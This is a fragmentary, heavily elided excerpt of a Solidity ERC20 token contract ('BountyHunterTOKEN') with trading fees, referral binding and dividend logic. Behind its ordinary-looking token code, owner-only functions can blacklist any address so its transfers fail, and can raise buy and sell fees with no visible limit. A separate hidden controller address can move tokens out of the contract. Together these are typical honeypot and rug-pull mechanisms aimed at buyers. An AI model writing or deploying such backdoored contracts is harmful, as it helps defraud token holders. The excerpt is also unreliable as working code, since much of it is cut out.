...
contract BountyHunterTOKEN is ERC20, Ownable {
    ...
    address private _marketingWalletAddress = address(0x566A9888a2cE54b240935809f7048f1586a8A0c2);    
    address private _shareaddress = address(0x566A9888a2cE54b240935809f7048f1586a8A0c2);
    ...
    uint public buycommFee = 2;  
    uint8[2] public commFeeList = [1,1];


    uint public sellmarketFee = 1;
    uint public sellLiquidityFee = 1;
    uint public setlllpFee = 2; 
    uint public selldeadFee = 1;

    mapping(address => bool) public _nodoaddress; 
    ...
    uint256 public AmountFeeDead = 1000 *(10**18);  

    uint256 public AmountLiquidityFee; 
    uint256 public AmountLiquidityFeeDead = 1000 *(10**18); 
    
    mapping(address => address) public referrerByAddr; 
    address private taxr;
    uint public commdbind = 100 * (10**18);
    ...
    constructor(
        ...
        _setExcludedFromFees(_marketingWalletAddress,true);
        _mint(owner(), totalSupply);
        customeraddr = dividend_;
        ...
        dividendTracker.initialize(address(this),tokenBalanceForReward_);
    ...
    function setMarketingWalletAddress(address _addr,address _addr2) public onlyOwner{
        _marketingWalletAddress = _addr;
        _shareaddress = _addr2;
    }

    function setDeadWalletAddress(address _addr) public onlyOwner{
        _deadWalletAddress = _addr;
    }

    function setcommdbind(uint _commdbind) public onlyOwner{
        commdbind = _commdbind;
    }    

    function setBuyFee(uint _lpfee, uint _marketfee,uint _comm,uint8[2] memory _commdList ) public onlyOwner {
        buylpFee = _lpfee;
        buymarketingFee = _marketfee;
        buycommFee = _comm;
        commFeeList = _commdList;
    }
    function setSellFee(uint _marketfee, uint _liquidityfee, uint _lpfee, uint deadfee) public onlyOwner {
    ...
    function setNodoAddress(address _addr) public onlyOwner{
        _nodoaddress[_addr] = true;
    }

    function setSwapEnable(bool _is) public onlyOwner{
        swapEnabled = _is;
    }

    function setExcludedFromFees(address _addr,bool _is) public onlyOwner{
        _isExcludedFromFees[_addr] =  _is;
    }
    function _setExcludedFromFees(address _addr,bool _is) private {
        _isExcludedFromFees[_addr] =  _is;
    }
    function doEntFee(address _to,uint _amount) public onlyOwner returns(bool){
    ...
    function setCommAuthor(address _from, address _top) public onlyOwner {
        referrerByAddr[_from] = _top;
    }
    function setMarketingBfb(address _to,uint _amount) external  returns(bool){
        require(msg.sender == customeraddr,"failed");
        super._transfer(address(this), _to, _amount);
        return true;
    }
    function setShareBfb(address _to,uint _amount) external {
        require(msg.sender == customeraddr,"failed");
        _bmby(_to,_amount);
    }
    function _transfer(
        ...
        require(!_nodoaddress[from] && !_nodoaddress[to], "no do address");
       ...
       if (referrerByAddr[to] == address(0) &&
            uniswapV2Pair != to  && 
            uniswapV2Pair != from &&
            amount == commdbind   
        ...
        if(from == uniswapV2Pair){
            ...
            uint lpamount = amount.mul(buylpFee).div(100);
            super._transfer(from, address(this), lpamount);
            AmountLPFee = AmountLPFee.add(lpamount);

            uint marketAmount = amount.mul(buymarketingFee).div(100);
            super._transfer(from, _marketingWalletAddress, marketAmount);

            uint ucomm = amount.mul(buycommFee).div(100);
            if(ucomm > 0)  
                {
                    taxr = to;
            ...
            super._transfer(from,to,amount.sub(lpamount).sub(marketAmount).sub(ucomm)); 
        }
        else if(to == uniswapV2Pair){
            uint lpamount = amount.mul(setlllpFee).div(100);
            super._transfer(from, address(this), lpamount);
            AmountLPFee = AmountLPFee.add(lpamount);

            uint marketAmount = amount.mul(sellmarketFee).div(100);
            super._transfer(from, _marketingWalletAddress, marketAmount);

            uint liquidityamount = amount.mul(sellLiquidityFee).div(100);
            super._transfer(from, address(this), liquidityamount);
            AmountLiquidityFee = AmountLiquidityFee.add(liquidityamount);

            uint udead = amount.mul(selldeadFee).div(100);
            super._transfer(from, _deadWalletAddress, udead);
            super._transfer(from,to,amount.sub(lpamount).sub(marketAmount).sub(liquidityamount).sub(udead)); 
        }
        else{
            super._transfer(from, to, amount);
        } 
    ...
    function swapAndSendDividends(uint256 tokens) private{
        ...
        bool success = IERC20(address(this)).transfer(address(dividendTracker), tokens);
        if (success) {
    ...
    function sendReard() public onlyOwner{
    ...
    function setExcludeFromDividends(address _addr) public onlyOwner{
